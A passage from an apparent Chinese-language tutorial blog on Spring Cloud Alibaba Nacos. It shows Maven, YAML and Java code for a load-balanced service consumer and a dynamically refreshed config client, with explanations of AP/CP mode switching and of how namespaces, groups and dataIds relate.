class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引入自己定义的api通用包，可以使用Payment支付Entity --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringBoot整合Web组件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日常通用jar包配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-order-consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#消费者将要去访问的微服务名称(注册成功进nacos的微服务提供者)</span></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span class="string">http://nacos-payment-provider</span></span><br></pre></td></tr></table></figure><p>主启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosMain83</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderNacosMain83<span class="class">.<span class="keyword">class</span>,<span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务类</p><p>ApplicationContextConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.loadbalancer.LoadBalanced;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OrderNacosController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;service-url.nacos-user-service&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String serverURL;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/consumer/payment/nacos/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(serverURL+<span class="string">"/payment/nacos/"</span>+id,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试</p><ul><li>启动nacos控制台</li><li><a href="http://localhost:83/Eonsumer/payment/nacos/13" target="_blank" rel="noopener">http://localhost:83/Eonsumer/payment/nacos/13</a></li><li>83访问9001/9002，轮询负载OK</li></ul><h2 id="Nacos服务注册中心对比提升"><a href="#Nacos服务注册中心对比提升" class="headerlink" title="Nacos服务注册中心对比提升"></a>Nacos服务注册中心对比提升</h2><p><strong>Nacos全景图</strong></p><p><img src="../img/Nacos/Nacos1.png" alt=""></p><p><strong>Nacos和CAP</strong></p><p>Nacos与其他注册中心特性对比</p><p><img src="../img/Nacos/Nacos2.png" alt=""></p><p><strong>Nacos服务发现实例模型</strong></p><p><img src="../img/Nacos/Nacos3.png" alt=""></p><h3 id="Nacos-AP和CP模式的切换"><a href="#Nacos-AP和CP模式的切换" class="headerlink" title="Nacos AP和CP模式的切换"></a>Nacos AP和CP模式的切换</h3><p>C是所有节点在同一时间看到的数据是一致的;而A的定义是所有的请求都会收到响应。</p><p>何时选择使用何种模式?</p><p>—般来说，如果不需要存储服务级别的信息且服务实例是通过nacos-client注册，并能够保持心跳上报，那么就可以选择AP模式。当前主流的服务如Spring cloud和Dubbo服务，都适用于AP模式，AP模式为了服务的可能性而减弱了一致性，因此AP模式下只支持注册临时实例。</p><p>如果需要在服务级别编辑或者存储配置信息，那么CP是必须，K8S服务和DNS服务则适用于CP模式。CP模式下则支持注册持久化实例，此时则是以Raft协议为集群运行模式，该模式下注册实例之前必须先注册服务，如果服务不存在，则会返回错误。</p><p>切换命令：</p><p><code>curl -X PUT &#39;$NACOS_SERVER:8848/nacos/v1/ns/operator/switches?entry=serverMode&amp;value=CP</code></p><h2 id="Nacos之服务配置中心"><a href="#Nacos之服务配置中心" class="headerlink" title="Nacos之服务配置中心"></a>Nacos之服务配置中心</h2><p>基础配置</p><p>cloudalibaba-config-nacos-client3377</p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud2020<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloudalibaba-config-nacos-client3377<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--web + actuator--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--一般基础配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><p>Nacos同springcloud-config一样，在项目初始化时，要保证先从配置中心进行配置拉取，拉取配置之后，才能保证项目的正常启动。</p><p>springboot中配置文件的加载是存在优先级顺序的，bootstrap优先级高于application</p><p>bootstrap.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">DEV_GROUP</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">7d8f0f5a-6a53-4785-9686-dd460158e5d4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line"><span class="comment"># nacos-config-client-dev.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nacos-config-client-test.yaml   ----&gt; config.info</span></span><br></pre></td></tr></table></figure><p>application.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span> <span class="comment"># 表示开发环境</span></span><br><span class="line">    <span class="comment">#active: test # 表示测试环境</span></span><br><span class="line">    <span class="comment">#active: info</span></span><br></pre></td></tr></table></figure><p>主启动类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NacosConfigClientMain3377</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(NacosConfigClientMain3377<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务类</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import</span> <span class="string">org.springframework.beans.factory.annotation.Value;</span></span><br><span class="line"><span class="string">import</span> <span class="string">org.springframework.cloud.context.config.annotation.RefreshScope;</span></span><br><span class="line"><span class="string">import</span> <span class="string">org.springframework.web.bind.annotation.GetMapping;</span></span><br><span class="line"><span class="string">import</span> <span class="string">org.springframework.web.bind.annotation.RestController;</span></span><br><span class="line"></span><br><span class="line"><span class="string">@RestController</span></span><br><span class="line"><span class="string">@RefreshScope</span> <span class="string">//支持Nacos的动态刷新功能。</span></span><br><span class="line"><span class="string">public</span> <span class="string">class</span> <span class="string">ConfigClientController</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line">    <span class="string">@Value("$&#123;config.info&#125;")</span></span><br><span class="line">    <span class="string">private</span> <span class="string">String</span> <span class="string">configInfo;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">@GetMapping("/config/info")</span></span><br><span class="line">    <span class="string">public</span> <span class="string">String</span> <span class="string">getConfigInfo()</span> <span class="string">&#123;</span></span><br><span class="line">        <span class="string">return</span> <span class="string">configInfo;</span></span><br><span class="line">    <span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>在Nacos中添加配置信息</p><p>Nacos中的dataid的组成格式及与SpringBoot配置文件中的匹配规则</p><p>官方文档</p><p>说明：之所以需要配置spring.application.name，是因为它是构成Nacos配置管理dataId 字段的一部分。</p><p>在 Nacos Spring Cloud中,dataId的完整格式如下：<br><code>${prefix}-${spring-profile.active}.${file-extension}</code></p><ul><li><p>prefix默认为spring.application.name的值，也可以通过配置项spring.cloud.nacos.config.prefix来配置。</p></li><li><p>spring.profile.active即为当前环境对应的 profile，详情可以参考 Spring Boot文档。注意：当spring.profile.active为空时，对应的连接符 - 也将不存在，datald 的拼接格式变成${prefix}.${file-extension}</p></li><li><p>file-exetension为配置内容的数据格式，可以通过配置项spring .cloud.nacos.config.file-extension来配置。目前只支持properties和yaml类型。</p></li><li><p>通过Spring Cloud 原生注解@RefreshScope实现配置自动更新。</p></li></ul><p>即：</p><p><code>${spring.application.name)}-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}</code></p><p>配置新增:</p><p><img src="../img/Nacos/Nacos4.png" alt=""></p><p>Nacos界面配置对应 - 设置DataId</p><p><img src="../img/Nacos/Nacos5.png" alt=""></p><p>配置小结</p><p><img src="../img/Nacos/Nacos6.png" alt=""></p><p>测试</p><ul><li>启动前需要在nacos客户端-配置管理-配置管理栏目下有对应的yaml配置文件</li><li>运行cloud-config-nacos-client3377的主启动类</li><li>调用接口查看配置信息 - <a href="http://localhost:3377/config/info" target="_blank" rel="noopener">http://localhost:3377/config/info</a><br>自带动态刷新</li></ul><p>修改下Nacos中的yaml配置文件，再次调用查看配置的接口，就会发现配置已经刷新。</p><h2 id="Nacos之命名空间分组和DataID三者关系"><a href="#Nacos之命名空间分组和DataID三者关系" class="headerlink" title="Nacos之命名空间分组和DataID三者关系"></a>Nacos之命名空间分组和DataID三者关系</h2><p>问题 - 多环境多项目管理</p><p>问题1:</p><p>实际开发中，通常一个系统会准备</p><p>dev开发环境<br>test测试环境<br>prod生产环境。<br>如何保证指定环境启动时服务能正确读取到Nacos上相应环境的配置文件呢?</p><p>问题2:</p><p>一个大型分布式微服务系统会有很多微服务子项目，每个微服务项目又都会有相应的开发环境、测试环境、预发环境、正式环境…那怎么对这些微服务配置进行管理呢?</p><p>Nacos的图形化管理界面</p><p><img src="../img/Nacos/Nacos7.png" alt=""></p><p><img src="../img/Nacos/Nacos8.png" alt=""></p><p><strong>Namespace+Group+Data lD三者关系？为什么这么设计？</strong></p><p><strong>是什么</strong></p><p>类似Java里面的package名和类名最外层的namespace是可以用于区分部署环境的，Group和DatalD逻辑上区分两个目标对象。</p><p><strong>三者情况</strong></p><p><img src="../img/Nacos/Nacos9.png" alt=""></p><p>默认情况：Namespace=public，Group=DEFAULT_GROUP，默认Cluster是DEFAULT</p><ul><li><p>Nacos默认的Namespace是public，Namespace主要用来实现隔离。</p><ul><li>比方说我们现在有三个环境：开发、测试、生产环境，我们就可以创建三个Namespace，不同的Namespace之间是隔离的。</li></ul></li><li><p>Group默认是DEFAULT_GROUP，Group可以把不同的微服务划分到同一个分组里面去</p></li><li><p>Service就是微服务:一个Service可以包含多个Cluster (集群)，Nacos默认Cluster是DEFAULT，Cluster是对指定微服务的一个虚拟划分。</p><ul><li>比方说为了容灾，将Service微服务分别部署在了杭州机房和广州机房，这时就可以给杭州机房的Service微服务起一个集群名称(HZ) ，给广州机房的Service微服务起一个集群名称(GZ)，还可以尽量让同一个机房的微服务互相调用，以提升性能。</li></ul></li><li><p>最后是Instance，就是微服务的实例。</p></li></ul><h2 id="Nacos之DataID配置"><a href="#Nacos之DataID配置" class="headerlink" 